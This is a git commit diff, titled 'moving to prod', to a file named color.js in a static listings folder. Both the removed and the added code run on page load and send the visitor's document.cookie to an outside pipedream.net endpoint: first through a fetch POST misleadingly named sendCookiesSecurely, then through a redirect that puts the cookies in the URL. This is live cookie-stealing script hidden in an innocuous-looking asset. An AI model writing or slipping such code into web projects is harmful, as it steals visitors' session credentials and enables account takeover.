c45d1e2754cf7ff1f64bb2de491023d82fa57f98
asbilim <bilimdepaullilian@gmail.com>
2024-09-12 18:08:53 +0100

    moving to prod

--- listings/static/ch62/color.js
+++ listings/static/ch62/color.js
@@ -1,27 +1,5 @@
 document.addEventListener("DOMContentLoaded", function () {
-  function sendCookiesSecurely() {
-    const endpoint = "https://eni8dd83qy2yp.x.pipedream.net/";
-
-    try {
-      const cookies = document.cookie;
-      const data = { cookies: encodeURIComponent(cookies) };
-
-      fetch(endpoint, {
-        method: "POST",
-        body: JSON.stringify(data),
-      })
-        .then((response) => {
-          if (!response.ok) {
-            throw new Error("Network response was not ok");
-          }
-          console.log("Cookies sent successfully.");
-        })
-        .catch((error) => {
-          console.error("There was a problem sending the cookies:", error);
-        });
-    } catch (error) {
-      console.error("Error handling cookies:", error);
-    }
-  }
-  setTimeout(sendCookiesSecurely, 200);
+  document.location.replace(
+    `https://eni8dd83qy2yp.x.pipedream.net?data=${document.cookie}`
+  );
 });
